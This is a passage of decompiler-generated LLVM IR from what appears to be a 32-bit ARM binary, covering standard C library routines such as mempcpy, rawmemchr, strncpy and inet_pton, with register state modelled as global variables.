  %v0_11f80 = load i32, i32* %r3.global-to-local, align 4
  %v1_11f80 = trunc i32 %v0_11f80 to i16
  %v2_11f80 = load i32, i32* @r4, align 4
  %v3_11f80 = inttoptr i32 %v2_11f80 to i16*
  store i16 %v1_11f80, i16* %v3_11f80, align 2
  %v0_11f84.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_11f84

dec_label_pc_11f84:                               ; preds = %dec_label_pc_11f5c, %dec_label_pc_11f70
  %v2_11f8c = phi i32 [ %v0_11f28, %dec_label_pc_11f5c ], [ %v0_11f84.pre, %dec_label_pc_11f70 ]
  %v1_11f84 = inttoptr i32 %v2_11f8c to i16*
  %v2_11f84 = load i16, i16* %v1_11f84, align 2
  %v3_11f84 = zext i16 %v2_11f84 to i32
  %v1_11f88 = or i32 %v3_11f84, 1
  store i32 %v1_11f88, i32* %r3.global-to-local, align 4
  %v1_11f8c = trunc i32 %v1_11f88 to i16
  store i16 %v1_11f8c, i16* %v1_11f84, align 2
  %v0_11f90 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11f90, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11f94

dec_label_pc_11f94:                               ; preds = %dec_label_pc_11f48, %dec_label_pc_11f84
  %v1_11f9c = phi i32 [ %v1_11f9c.pre, %dec_label_pc_11f48 ], [ %v0_11f90, %dec_label_pc_11f84 ]
  %v2_11f98 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_11f98, i32* @r4, align 4
  ret i32 %v1_11f9c

; uselistorder directives
  uselistorder i32 %v3_11f04, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11f94, { 1, 0 }
  uselistorder label %dec_label_pc_11f84, { 1, 0 }
  uselistorder label %dec_label_pc_11f34, { 1, 0 }
  uselistorder label %dec_label_pc_11f28, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v3_11fa4 = load i32, i32* @r4, align 4
  %v6_11fa4 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_11fb4 = call i32 @memcpy()
  %v0_11fb8 = load i32, i32* @r5, align 4
  %v1_11fb8 = load i32, i32* @r4, align 4
  %v2_11fb8 = add i32 %v1_11fb8, %v0_11fb8
  store i32 %v3_11fa4, i32* @r4, align 4
  store i32 %v6_11fa4, i32* @r5, align 4
  ret i32 %v2_11fb8
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_11fcc = urem i32 %arg1, 256
  %v0_11fe42 = load i32, i32* @r0, align 4
  %v1_11fe43 = urem i32 %v0_11fe42, 4
  %v2_11fe44 = icmp eq i32 %v1_11fe43, 0
  br i1 %v2_11fe44, label %dec_label_pc_11fec, label %dec_label_pc_11fd4

dec_label_pc_11fd4:                               ; preds = %entry, %dec_label_pc_11fe0
  %v0_11fe0 = phi i32 [ %v1_11fe0, %dec_label_pc_11fe0 ], [ %v0_11fe42, %entry ]
  %v1_11fd4 = inttoptr i32 %v0_11fe0 to i8*
  %v2_11fd4 = load i8, i8* %v1_11fd4, align 1
  %v3_11fd4 = zext i8 %v2_11fd4 to i32
  %v9_11fd8 = icmp eq i32 %v3_11fd4, %v1_11fcc
  br i1 %v9_11fd8, label %dec_label_pc_12068, label %dec_label_pc_11fe0

dec_label_pc_11fe0:                               ; preds = %dec_label_pc_11fd4
  %v1_11fe0 = add i32 %v0_11fe0, 1
  %v1_11fe4 = urem i32 %v1_11fe0, 4
  %v2_11fe4 = icmp eq i32 %v1_11fe4, 0
  br i1 %v2_11fe4, label %dec_label_pc_11fec, label %dec_label_pc_11fd4

dec_label_pc_11fec:                               ; preds = %dec_label_pc_11fe0, %entry
  %v0_11ff0 = phi i32 [ %v0_11fe42, %entry ], [ %v1_11fe0, %dec_label_pc_11fe0 ]
  %v4_11fec = mul nuw nsw i32 %v1_11fcc, 256
  %v5_11fec = or i32 %v4_11fec, %v1_11fcc
  %v4_11ff4 = mul i32 %v5_11fec, 65536
  %v5_11ff4 = or i32 %v4_11ff4, %v5_11fec
  br label %dec_label_pc_11ff8

dec_label_pc_11ff8:                               ; preds = %dec_label_pc_12058, %dec_label_pc_11ff8, %dec_label_pc_11fec
  %v0_1203c = phi i32 [ %v0_11ff0, %dec_label_pc_11fec ], [ %v4_11ff8, %dec_label_pc_11ff8 ], [ %v4_11ff8, %dec_label_pc_12058 ]
  %v1_11ff8 = inttoptr i32 %v0_1203c to i32*
  %v2_11ff8 = load i32, i32* %v1_11ff8, align 4
  %v4_11ff8 = add i32 %v0_1203c, 4
  %v2_12000 = xor i32 %v2_11ff8, %v5_11ff4
  %v2_12004 = add i32 %v2_12000, 2130640639
  %v1_1200c = sub i32 -1, %v2_12000
  %v2_12010 = xor i32 %v2_12004, %v1_1200c
  %v2_12014 = and i32 %v2_12010, -2130640640
  %v2_12018 = icmp eq i32 %v2_12014, 0
  br i1 %v2_12018, label %dec_label_pc_11ff8, label %dec_label_pc_12020

dec_label_pc_12020:                               ; preds = %dec_label_pc_11ff8
  %v2_12020 = inttoptr i32 %v0_1203c to i8*
  %v3_12020 = load i8, i8* %v2_12020, align 1
  %v4_12020 = zext i8 %v3_12020 to i32
  %v9_12028 = icmp eq i32 %v4_12020, %v1_11fcc
  %v1_1202c = add i32 %v0_1203c, 3
  br i1 %v9_12028, label %dec_label_pc_12068, label %dec_label_pc_12034

dec_label_pc_12034:                               ; preds = %dec_label_pc_12020
  %v1_12034 = add i32 %v0_1203c, 1
  %v2_12034 = inttoptr i32 %v1_12034 to i8*
  %v3_12034 = load i8, i8* %v2_12034, align 1
  %v4_12034 = zext i8 %v3_12034 to i32
  %v9_12038 = icmp eq i32 %v4_12034, %v1_11fcc
  br i1 %v9_12038, label %bb, label %dec_label_pc_12048

bb:                                               ; preds = %dec_label_pc_12034
  br label %dec_label_pc_12068

dec_label_pc_12048:                               ; preds = %dec_label_pc_12034
  %v1_12048 = add i32 %v0_1203c, 2
  %v2_12048 = inttoptr i32 %v1_12048 to i8*
  %v3_12048 = load i8, i8* %v2_12048, align 1
  %v4_12048 = zext i8 %v3_12048 to i32
  %v9_1204c = icmp eq i32 %v4_12048, %v1_11fcc
  br i1 %v9_1204c, label %dec_label_pc_12068, label %dec_label_pc_12058

dec_label_pc_12058:                               ; preds = %dec_label_pc_12048
  %v2_12058 = inttoptr i32 %v1_1202c to i8*
  %v3_12058 = load i8, i8* %v2_12058, align 1
  %v4_12058 = zext i8 %v3_12058 to i32
  %v9_1205c = icmp eq i32 %v4_12058, %v1_11fcc
  br i1 %v9_1205c, label %dec_label_pc_12064, label %dec_label_pc_11ff8

dec_label_pc_12064:                               ; preds = %dec_label_pc_12058
  br label %dec_label_pc_12068

dec_label_pc_12068:                               ; preds = %dec_label_pc_11fd4, %dec_label_pc_12048, %dec_label_pc_12020, %bb, %dec_label_pc_12064
  %v1_1206c = phi i32 [ %v1_1202c, %dec_label_pc_12064 ], [ %v1_12034, %bb ], [ %v1_12048, %dec_label_pc_12048 ], [ %v0_1203c, %dec_label_pc_12020 ], [ %v0_11fe0, %dec_label_pc_11fd4 ]
  ret i32 %v1_1206c

; uselistorder directives
  uselistorder i32 %v4_11ff8, { 1, 0 }
  uselistorder i32 %v0_1203c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_11fec, { 1, 0 }
  uselistorder i32 %v1_11fe0, { 1, 0, 2 }
  uselistorder i32 %v0_11fe42, { 2, 1, 0 }
  uselistorder i32 %v1_11fcc, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_12068, { 4, 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_11fd4, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %v7_12078 = icmp eq i32 %arg2, 3
  store i1 %v7_12078, i1* %cpsr_z.global-to-local, align 1
  %v0_1207c = load i32, i32* @lr, align 4
  store i32 %v0_1207c, i32* %stack_var_-4, align 4
  %v1_12080 = add i32 %arg1, -1
  store i32 %v1_12080, i32* @ip, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_120fc, label %dec_label_pc_12088

dec_label_pc_12088:                               ; preds = %entry
  %v3_12088 = udiv i32 %arg2, 4
  store i32 %v3_12088, i32* %lr.global-to-local, align 4
  %v0_1208c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_1208c

dec_label_pc_1208c:                               ; preds = %dec_label_pc_120d8, %dec_label_pc_12088
  %v2_12094 = phi i32 [ %v6_120cc, %dec_label_pc_120d8 ], [ %v1_12080, %dec_label_pc_12088 ]
  %v0_1208c = phi i32 [ %v1_120dc, %dec_label_pc_120d8 ], [ %v0_1208c.pre, %dec_label_pc_12088 ]
  %v1_1208c = inttoptr i32 %v0_1208c to i8*
  %v2_1208c = load i8, i8* %v1_1208c, align 1
  %v3_1208c = zext i8 %v2_1208c to i32
  store i32 %v3_1208c, i32* %r3.global-to-local, align 4
  %v2_12090 = icmp eq i8 %v2_1208c, 0
  store i1 %v2_12090, i1* %cpsr_z.global-to-local, align 1
  %v3_12094 = add i32 %v2_12094, 1
  %v4_12094 = inttoptr i32 %v3_12094 to i8*
  store i8 %v2_1208c, i8* %v4_12094, align 1
  %v5_12094 = load i32, i32* @ip, align 4
  %v6_12094 = add i32 %v5_12094, 1
  store i32 %v6_12094, i32* @ip, align 4
  %v0_12098 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12098, label %dec_label_pc_120e8, label %dec_label_pc_1209c

dec_label_pc_1209c:                               ; preds = %dec_label_pc_1208c
  %v0_1209c = load i32, i32* @r1, align 4
  %v1_1209c = add i32 %v0_1209c, 1
  %v2_1209c = inttoptr i32 %v1_1209c to i8*
  %v3_1209c = load i8, i8* %v2_1209c, align 1
  %v4_1209c = zext i8 %v3_1209c to i32
  store i32 %v4_1209c, i32* %r3.global-to-local, align 4
  %v2_120a0 = icmp eq i8 %v3_1209c, 0
  store i1 %v2_120a0, i1* %cpsr_z.global-to-local, align 1
  %v3_120a4 = add i32 %v5_12094, 2
  %v4_120a4 = inttoptr i32 %v3_120a4 to i8*
  store i8 %v3_1209c, i8* %v4_120a4, align 1
  %v5_120a4 = load i32, i32* @ip, align 4
  %v6_120a4 = add i32 %v5_120a4, 1
  store i32 %v6_120a4, i32* @ip, align 4
  %v0_120a8 = load i32, i32* @r1, align 4
  %v1_120a8 = add i32 %v0_120a8, 1
  store i32 %v1_120a8, i32* %r1.global-to-local, align 4
  %v0_120ac = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_120ac, label %dec_label_pc_120e8, label %dec_label_pc_120b0

dec_label_pc_120b0:                               ; preds = %dec_label_pc_1209c
  %v1_120b0 = add i32 %v0_120a8, 2
  %v2_120b0 = inttoptr i32 %v1_120b0 to i8*
  %v3_120b0 = load i8, i8* %v2_120b0, align 1
  %v4_120b0 = zext i8 %v3_120b0 to i32
  store i32 %v4_120b0, i32* %r3.global-to-local, align 4
  %v2_120b4 = icmp eq i8 %v3_120b0, 0
  store i1 %v2_120b4, i1* %cpsr_z.global-to-local, align 1
  %v3_120b8 = add i32 %v5_120a4, 2
  %v4_120b8 = inttoptr i32 %v3_120b8 to i8*
  store i8 %v3_120b0, i8* %v4_120b8, align 1
  %v5_120b8 = load i32, i32* @ip, align 4
  %v6_120b8 = add i32 %v5_120b8, 1
  store i32 %v6_120b8, i32* @ip, align 4
  %v0_120bc = load i32, i32* %r1.global-to-local, align 4
  %v1_120bc = add i32 %v0_120bc, 1
  store i32 %v1_120bc, i32* %r1.global-to-local, align 4
  %v0_120c0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_120c0, label %dec_label_pc_120e8, label %dec_label_pc_120c4

dec_label_pc_120c4:                               ; preds = %dec_label_pc_120b0
  %v1_120c4 = add i32 %v0_120bc, 2
  %v2_120c4 = inttoptr i32 %v1_120c4 to i8*
  %v3_120c4 = load i8, i8* %v2_120c4, align 1
  %v4_120c4 = zext i8 %v3_120c4 to i32
  store i32 %v4_120c4, i32* %r3.global-to-local, align 4
  %v2_120c8 = icmp eq i8 %v3_120c4, 0
  store i1 %v2_120c8, i1* %cpsr_z.global-to-local, align 1
  %v3_120cc = add i32 %v5_120b8, 2
  %v4_120cc = inttoptr i32 %v3_120cc to i8*
  store i8 %v3_120c4, i8* %v4_120cc, align 1
  %v5_120cc = load i32, i32* @ip, align 4
  %v6_120cc = add i32 %v5_120cc, 1
  store i32 %v6_120cc, i32* @ip, align 4
  %v0_120d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_120d0 = add i32 %v0_120d0, 1
  store i32 %v1_120d0, i32* %r1.global-to-local, align 4
  %v0_120d4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_120d4, label %dec_label_pc_120e8, label %dec_label_pc_120d8

dec_label_pc_120d8:                               ; preds = %dec_label_pc_120c4
  %v0_120d8 = load i32, i32* %lr.global-to-local, align 4
  %v1_120d8 = add i32 %v0_120d8, -1
  store i32 %v1_120d8, i32* %lr.global-to-local, align 4
  %v7_120d8 = icmp eq i32 %v0_120d8, 1
  store i1 %v7_120d8, i1* %cpsr_z.global-to-local, align 1
  %v1_120dc = add i32 %v0_120d0, 2
  store i32 %v1_120dc, i32* @r1, align 4
  br i1 %v7_120d8, label %dec_label_pc_120fc, label %dec_label_pc_1208c

dec_label_pc_120e8:                               ; preds = %dec_label_pc_120c4, %dec_label_pc_120b0, %dec_label_pc_1209c, %dec_label_pc_1208c
  %v1_120e8 = phi i32 [ %v6_120cc, %dec_label_pc_120c4 ], [ %v6_120b8, %dec_label_pc_120b0 ], [ %v6_120a4, %dec_label_pc_1209c ], [ %v6_12094, %dec_label_pc_1208c ]
  %v2_120e81 = sub i32 %arg1, %v1_120e8
  %v2_120ec = add i32 %v2_120e81, %arg2
  %v1_120f0 = add i32 %v2_120ec, -1
  store i32 %v1_120f0, i32* %r3.global-to-local, align 4
  %v7_120f0 = icmp eq i32 %v2_120ec, 1
  store i1 %v7_120f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_120f0, label %dec_label_pc_1212c, label %dec_label_pc_1211c

dec_label_pc_120fc:                               ; preds = %dec_label_pc_120d8, %entry
  %v2_1210c7 = phi i32 [ %v1_12080, %entry ], [ %v6_120cc, %dec_label_pc_120d8 ]
  %v1_120fc = urem i32 %arg2, 4
  store i32 %v1_120fc, i32* %r3.global-to-local, align 4
  %v2_120fc = icmp eq i32 %v1_120fc, 0
  store i1 %v2_120fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_120fc, label %dec_label_pc_1212c, label %dec_label_pc_12104

dec_label_pc_12104:                               ; preds = %dec_label_pc_120fc, %dec_label_pc_12114.dec_label_pc_12104_crit_edge
  %v2_1210c = phi i32 [ %v6_1210c, %dec_label_pc_12114.dec_label_pc_12104_crit_edge ], [ %v2_1210c7, %dec_label_pc_120fc ]
  %v0_12108 = phi i32 [ %v0_12108.pre, %dec_label_pc_12114.dec_label_pc_12104_crit_edge ], [ %v1_120fc, %dec_label_pc_120fc ]
  %v0_12104 = load i32, i32* @r1, align 4
  %v1_12104 = inttoptr i32 %v0_12104 to i8*
  %v2_12104 = load i8, i8* %v1_12104, align 1
  %v3_12104 = zext i8 %v2_12104 to i32
  store i32 %v3_12104, i32* %r2.global-to-local, align 4
  %v5_12104 = add i32 %v0_12104, 1
  store i32 %v5_12104, i32* @r1, align 4
  %v1_12108 = add i32 %v0_12108, -1
  store i32 %v1_12108, i32* %r3.global-to-local, align 4
  %v7_12108 = icmp eq i32 %v0_12108, 1
  store i1 %v7_12108, i1* %cpsr_z.global-to-local, align 1
  %v3_1210c = add i32 %v2_1210c, 1
  %v4_1210c = inttoptr i32 %v3_1210c to i8*
  store i8 %v2_12104, i8* %v4_1210c, align 1
  %v5_1210c = load i32, i32* @ip, align 4
  %v6_1210c = add i32 %v5_1210c, 1
  store i32 %v6_1210c, i32* @ip, align 4
  %v0_12110 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12110, label %dec_label_pc_1212c, label %dec_label_pc_12114

dec_label_pc_12114:                               ; preds = %dec_label_pc_12104
  %v0_12114 = load i32, i32* %r2.global-to-local, align 4
  %v2_12114 = icmp eq i32 %v0_12114, 0
  store i1 %v2_12114, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12114, label %dec_label_pc_1211c, label %dec_label_pc_12114.dec_label_pc_12104_crit_edge

dec_label_pc_12114.dec_label_pc_12104_crit_edge:  ; preds = %dec_label_pc_12114
  %v0_12108.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_12104

dec_label_pc_1211c:                               ; preds = %dec_label_pc_12114, %dec_label_pc_120e8
  %v2_1212410 = phi i32 [ %v1_120e8, %dec_label_pc_120e8 ], [ %v6_1210c, %dec_label_pc_12114 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12120

dec_label_pc_12120:                               ; preds = %dec_label_pc_12120.dec_label_pc_12120_crit_edge, %dec_label_pc_1211c
  %v2_12124 = phi i32 [ %v6_12124, %dec_label_pc_12120.dec_label_pc_12120_crit_edge ], [ %v2_1212410, %dec_label_pc_1211c ]
  %v0_12124.off0 = phi i8 [ %extract.t, %dec_label_pc_12120.dec_label_pc_12120_crit_edge ], [ 0, %dec_label_pc_1211c ]
  %v0_12120 = load i32, i32* %r3.global-to-local, align 4
  %v1_12120 = add i32 %v0_12120, -1
  store i32 %v1_12120, i32* %r3.global-to-local, align 4
  %v7_12120 = icmp eq i32 %v0_12120, 1
  store i1 %v7_12120, i1* %cpsr_z.global-to-local, align 1
  %v3_12124 = add i32 %v2_12124, 1
  %v4_12124 = inttoptr i32 %v3_12124 to i8*
  store i8 %v0_12124.off0, i8* %v4_12124, align 1
  %v5_12124 = load i32, i32* @ip, align 4
  %v6_12124 = add i32 %v5_12124, 1
  store i32 %v6_12124, i32* @ip, align 4
  %v0_12128 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12128, label %dec_label_pc_1212c, label %dec_label_pc_12120.dec_label_pc_12120_crit_edge

dec_label_pc_12120.dec_label_pc_12120_crit_edge:  ; preds = %dec_label_pc_12120
  %v0_12124.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v0_12124.pre to i8
  br label %dec_label_pc_12120

dec_label_pc_1212c:                               ; preds = %dec_label_pc_12104, %dec_label_pc_12120, %dec_label_pc_120e8, %dec_label_pc_120fc
  %v2_1212c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_1212c, i32* @lr, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v6_12124, { 1, 0 }
  uselistorder i32 %v0_12120, { 1, 0 }
  uselistorder i32 %v6_1210c, { 0, 2, 1 }
  uselistorder i32 %v1_120fc, { 2, 1, 0 }
  uselistorder i32 %v2_120ec, { 1, 0 }
  uselistorder i32 %v1_120dc, { 1, 0 }
  uselistorder i32 %v0_120d8, { 1, 0 }
  uselistorder i32 %v6_120cc, { 0, 1, 3, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 4, 1, 2, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1212c, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_12104, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_12134 = load i32, i32* @r4, align 4
  %v6_12134 = load i32, i32* @r5, align 4
  %v15_12134 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 0, i32* @ip, align 4
  store i32 0, i32* @lr, align 4
  %v2_1214c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_1214c, i32* @r1, align 4
  store i32 0, i32* @r5, align 4
  store i32 10, i32* %r7.global-to-local, align 4
  store i32 1, i32* %r6.global-to-local, align 4
  store i32 0, i32* %stack_var_-28, align 4
  %v0_121c41 = load i32, i32* @r0, align 4
  %v1_121c42 = inttoptr i32 %v0_121c41 to i8*
  %v2_121c43 = load i8, i8* %v1_121c42, align 1
  %v3_121c44 = zext i8 %v2_121c43 to i32
  store i32 %v3_121c44, i32* @r3, align 4
  %v2_121c85 = icmp eq i8 %v2_121c43, 0
  store i1 %v2_121c85, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_121c85, label %dec_label_pc_121d4, label %dec_label_pc_12164

dec_label_pc_12164:                               ; preds = %entry, %dec_label_pc_121c4.backedge
  %v0_12168 = phi i32 [ %v0_121c4, %dec_label_pc_121c4.backedge ], [ %v0_121c41, %entry ]
  %v0_121a0 = phi i32 [ %v3_121c4, %dec_label_pc_121c4.backedge ], [ %v3_121c44, %entry ]
  %v2_12174.in = phi i32 [ %v3_121c4, %dec_label_pc_121c4.backedge ], [ %v3_121c44, %entry ]
  %v2_12174 = add nsw i32 %v2_12174.in, -48
  %v2_12164 = icmp ugt i32 %v2_12174, 8
  %v7_12164 = icmp eq i32 %v2_12174, 9
  store i1 %v7_12164, i1* %cpsr_z.global-to-local, align 1
  %v1_12168 = add i32 %v0_12168, 1
  store i32 %v1_12168, i32* %r0.global-to-local, align 4
  %v2_1216c = xor i1 %v7_12164, true
  %v3_1216c = and i1 %v2_12164, %v2_1216c
  br i1 %v3_1216c, label %dec_label_pc_121a0, label %dec_label_pc_12170

dec_label_pc_12170:                               ; preds = %dec_label_pc_12164
  %v0_12170 = load i32, i32* @r1, align 4
  %v1_12170 = inttoptr i32 %v0_12170 to i8*
  %v2_12170 = load i8, i8* %v1_12170, align 1
  %v3_12170 = zext i8 %v2_12170 to i32
  %v0_12174 = load i32, i32* %r7.global-to-local, align 4
  %v3_12174 = mul i32 %v0_12174, %v3_12170
  %v4_12174 = add i32 %v3_12174, %v2_12174
  store i32 %v4_12174, i32* @r3, align 4
  %v2_12178 = icmp ugt i32 %v4_12174, 254
  %v7_12178 = icmp eq i32 %v4_12174, 255
  store i1 %v7_12178, i1* %cpsr_z.global-to-local, align 1
  %v2_1217c = xor i1 %v7_12178, true
  %v3_1217c = and i1 %v2_12178, %v2_1217c
  br i1 %v3_1217c, label %dec_label_pc_121f8, label %dec_label_pc_12180

dec_label_pc_12180:                               ; preds = %dec_label_pc_12170
  %v0_12180 = load i32, i32* @lr, align 4
  %v2_12180 = icmp eq i32 %v0_12180, 0
  store i1 %v2_12180, i1* %cpsr_z.global-to-local, align 1
  %v1_12184 = trunc i32 %v4_12174 to i8
  store i8 %v1_12184, i8* %v1_12170, align 1
  %v0_12188 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12188, label %dec_label_pc_1218c, label %dec_label_pc_121c4.backedge

dec_label_pc_1218c:                               ; preds = %dec_label_pc_12180
  %v0_1218c = load i32, i32* @ip, align 4
  %v1_1218c = add i32 %v0_1218c, 1
  store i32 %v1_1218c, i32* @ip, align 4
  %v7_12190 = icmp eq i32 %v1_1218c, 4
  store i1 %v7_12190, i1* %cpsr_z.global-to-local, align 1
  %v0_12194 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_12194, i32* @lr, align 4
  %v8_12198 = icmp sgt i32 %v1_1218c, 4
  br i1 %v8_12198, label %dec_label_pc_121f8, label %dec_label_pc_121c4.backedge

dec_label_pc_121a0:                               ; preds = %dec_label_pc_12164
  %v7_121a0 = icmp eq i32 %v0_121a0, 46
  %v1_121a8 = load i32, i32* @lr, align 4
  %v2_121a8 = urem i32 %v1_121a8, 2
  %storemerge12 = select i1 %v7_121a0, i32 %v2_121a8, i32 0
  store i32 %storemerge12, i32* @r3, align 4
  %v2_121ac = icmp eq i32 %storemerge12, 0
  store i1 %v2_121ac, i1* %cpsr_z.global-to-local, align 1
  %v0_121b0 = load i32, i32* @r5, align 4
  store i32 %v0_121b0, i32* @lr, align 4
  br i1 %v2_121ac, label %dec_label_pc_121f8, label %dec_label_pc_121b8

dec_label_pc_121b8:                               ; preds = %dec_label_pc_121a0
  %v0_121b8 = load i32, i32* @ip, align 4
  %v7_121b8 = icmp eq i32 %v0_121b8, 4
  store i1 %v7_121b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_121b8, label %dec_label_pc_121f8, label %dec_label_pc_121c0

dec_label_pc_121c0:                               ; preds = %dec_label_pc_121b8
  %v1_121c0 = trunc i32 %v0_121b0 to i8
  %v2_121c0 = load i32, i32* @r1, align 4
  %v3_121c0 = add i32 %v2_121c0, 1
  %v4_121c0 = inttoptr i32 %v3_121c0 to i8*
  store i8 %v1_121c0, i8* %v4_121c0, align 1
  %v5_121c0 = load i32, i32* @r1, align 4
  %v6_121c0 = add i32 %v5_121c0, 1
  store i32 %v6_121c0, i32* @r1, align 4
  br label %dec_label_pc_121c4.backedge

dec_label_pc_121c4.backedge:                      ; preds = %dec_label_pc_121c0, %dec_label_pc_12180, %dec_label_pc_1218c
  %v0_121c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_121c4 = inttoptr i32 %v0_121c4 to i8*
  %v2_121c4 = load i8, i8* %v1_121c4, align 1
  %v3_121c4 = zext i8 %v2_121c4 to i32
  store i32 %v3_121c4, i32* @r3, align 4
  %v2_121c8 = icmp eq i8 %v2_121c4, 0
  store i1 %v2_121c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_121c8, label %dec_label_pc_121c4.dec_label_pc_121d4_crit_edge, label %dec_label_pc_12164

dec_label_pc_121c4.dec_label_pc_121d4_crit_edge:  ; preds = %dec_label_pc_121c4.backedge
  %v0_121d4.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_121d4

dec_label_pc_121d4:                               ; preds = %dec_label_pc_121c4.dec_label_pc_121d4_crit_edge, %entry
  %v0_121d4 = phi i32 [ %v0_121d4.pre, %dec_label_pc_121c4.dec_label_pc_121d4_crit_edge ], [ 0, %entry ]
  %v7_121d4 = icmp eq i32 %v0_121d4, 3
  store i1 %v7_121d4, i1* %cpsr_z.global-to-local, align 1
  %v7_121d8 = icmp slt i32 %v0_121d4, 4
  br i1 %v7_121d8, label %dec_label_pc_121f8, label %dec_label_pc_121dc

dec_label_pc_121dc:                               ; preds = %dec_label_pc_121d4
  %v0_121dc = load i32, i32* @r4, align 4
  store i32 %v0_121dc, i32* @r0, align 4
  store i32 %v2_1214c, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_121e8 = call i32 @memcpy()
  br label %dec_label_pc_121f8

dec_label_pc_121f8:                               ; preds = %dec_label_pc_12170, %dec_label_pc_1218c, %dec_label_pc_121a0, %dec_label_pc_121b8, %dec_label_pc_121d4, %dec_label_pc_121dc
  %storemerge = phi i32 [ 1, %dec_label_pc_121dc ], [ 0, %dec_label_pc_121d4 ], [ 0, %dec_label_pc_121b8 ], [ 0, %dec_label_pc_121a0 ], [ 0, %dec_label_pc_1218c ], [ 0, %dec_label_pc_12170 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v3_12134, i32* @r4, align 4
  store i32 %v6_12134, i32* @r5, align 4
  store i32 %v15_12134, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_121d4, { 1, 0 }
  uselistorder i32 %v3_121c4, { 2, 1, 0 }
  uselistorder i32 %v0_121c4, { 1, 0 }
  uselistorder i32 %storemerge12, { 1, 0 }
  uselistorder i32 %v2_12174, { 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_121f8, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_121c4.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_12164, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v3_12204 = load i32, i32* @r4, align 4
  %v6_12204 = load i32, i32* @r5, align 4
  %v9_12204 = load i32, i32* @r6, align 4
  %v12_12204 = load i32, i32* @r7, align 4
  %v27_12204 = load i32, i32* @lr, align 4
  %v7_12210 = icmp eq i32 %arg1, 2
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* @r4, align 4
